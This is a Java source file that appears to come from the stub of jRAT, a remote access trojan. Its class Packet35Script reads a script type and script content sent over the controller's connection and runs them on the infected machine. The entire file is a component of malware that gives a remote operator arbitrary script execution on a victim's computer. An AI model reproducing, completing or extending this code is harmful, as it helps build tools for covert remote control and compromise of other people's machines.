package se.jrat.stub.packets.incoming;

import se.jrat.common.script.AbstractScript;
import se.jrat.stub.Connection;

public class Packet35Script extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String type = Connection.readLine();
		String content = Connection.readLine();
		
		AbstractScript script = AbstractScript.getScript(type);
		script.setContent(content);
		script.perform();
	}

}
